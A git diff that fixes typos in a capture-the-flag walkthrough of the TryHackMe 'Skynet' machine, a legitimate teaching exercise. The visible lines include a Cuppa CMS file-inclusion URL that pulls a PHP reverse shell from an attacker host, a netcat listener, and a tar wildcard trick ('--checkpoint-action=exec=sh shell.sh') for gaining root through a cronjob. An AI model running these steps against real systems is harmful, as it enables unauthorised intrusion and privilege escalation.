@@ -16,7 +16,8 @@ nav_order: 2
 - Summary
 - Recon
 - Intrusion
-- Explotation
+- Exploitation
+- Privilege Escalation
 {:toc}
 
 ## [](#header-2)Summary:
@@ -24,13 +25,13 @@ nav_order: 2
 1. Find/Enumerate Samba Shares
 2. Bruteforce mail server login 
 3. Find hidden web dir 
-4. Use Cuppa exploit to drop remote shell for intitial access
+4. Use Cuppa exploit to drop remote shell for initial access
 5. Privesc using cronjob
 
 ## [](#header-2)Recon:
 
 
-Intial nmap scan shows an Apache server running on port 80, email clients (pop3/imap),and some "potentially" vulnerable samaba shares.
+Intial nmap scan shows an Apache server running on port 80, email clients (pop3/imap),and some "potentially" vulnerable samba shares.
 ![](pictures/nmap0-skynet.PNG)
 
 
@@ -38,11 +39,11 @@ Navigating to the apache server on port 80 we see a skynet search engine which d
 
 ![](pictures/website-skynet.PNG)
 
-After running smbmap on the host we can see there are 4 seperate shares.
+After running smbmap on the host we can see there are 4 separate shares.
 
 ![](pictures/smbmap-skynet.PNG)
 
-Running gobuster reveals two interesting finds an admin direcory and a mail server called "squirrelmail".
+Running gobuster reveals two interesting finds an admin directory and a mail server called "squirrelmail".
 
 ![](pictures/gobuster0-skynet.PNG)
 
@@ -65,7 +66,7 @@ smbget -R smb://<target ip>/anonymous
 ![](pictures/sambaget-skynet.PNG)
 
 
-Reading the attention txt file we find out that passwords for users accross the system have been changed, some may call this a "clue".
+Reading the attention txt file we find out that passwords for users across the system have been changed, some may call this a "clue".
 ```bash
 kali@kali:~/Desktop/tryhackme/skynet$ cat attention.txt
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
@@ -121,7 +122,7 @@ Once we're into Miles's email we find three emails containing some odd/useful co
 
 ![](pictures/webmail-skynet.png)
 
-There are two emails with AI lingo in them one being binary and the other ASCII but they both have the same infoormation.
+There are two emails with AI lingo in them one being binary and the other ASCII but they both have the same information.
 It's pretty much useless information but you can find more out about it here:
 https://www.dailydot.com/debug/facebook-ai-invent-language/
 
@@ -258,9 +259,9 @@ Able to read sensitive information via File Inclusion (PHP Stream)
 
 The vulnerability allows us to drop a reverse php shell on the victim machine after creating a customized query.
 
-The php rverse shell I used can be found here "/usr/share/webshells/php/php-reverse-shell.php" in kali as well as on pentest monkey's website.
+The php reverse shell I used can be found here "/usr/share/webshells/php/php-reverse-shell.php" in kali as well as on pentest monkey's website.
 
-Once we have reverse shell ready to go we set up our netcat listener to recieve the incoming connection.
+Once we have reverse shell ready to go we set up our netcat listener to receive the incoming connection.
 
 Then we throw our query in the browser
 http://<victim ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attcker ip>:8000/php-reverse-shell.php
@@ -273,7 +274,7 @@ From here we can find the user.txt flag in miles directory.
 
 ## [](#header-2)Privilege Escalation:
 
-Cronjobs are one of the main things I check during a CTF and once I checked /etc/crontab I saw that there was a cronjob going off every minute which is definetly interesting.
+Cronjobs are one of the main things I check during a CTF and once I checked /etc/crontab I saw that there was a cronjob going off every minute which is definitely interesting.
 
 ![](pictures/privesc-skynet.png)
 
@@ -290,12 +291,12 @@ I found that it backs up the /var/www/html directory with the tar command which 
 An article that also really helped me understand what was going on during this technique:
 https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
 
-The basics of it are that three seperate folders are made within the /var/www/html folder
+The basics of it are that three separate folders are made within the /var/www/html folder
 - --checkpoint=1 
 - --checkpoint-action=exec=sh shell.sh
 - shell.sh
 
-In combination these folders allow arbitrary code exectution(our shell file) whenever the file is zipped with tar during the cronjob
+In combination these folders allow arbitrary code execution(our shell file) whenever the file is zipped with tar during the cronjob
 
 ![](pictures/root-skynet.png)
 
